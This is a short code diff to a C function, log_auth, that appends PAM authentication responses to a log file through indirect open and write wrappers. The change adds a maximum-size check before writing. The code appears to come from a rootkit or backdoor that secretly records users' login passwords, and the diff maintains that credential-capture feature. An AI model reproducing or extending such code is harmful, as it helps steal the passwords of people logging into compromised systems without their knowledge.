@@ -37,6 +37,12 @@ void log_auth(pam_handle_t *pamh, char *resp){
     if(alreadylogged(LOG_PATH, logbuf))
         return;
 
+#ifdef MAX_LOGS_SIZE
+    off_t newsize = getnewfilesize(LOG_PATH, strlen(logbuf)+1);
+    if(newsize > MAX_LOGS_SIZE)
+        return;
+#endif
+
     fp = call(CFOPEN, LOG_PATH, "a");
     if(fp == NULL) return;
     call(CFWRITE, logbuf, 1, strlen(logbuf), fp);
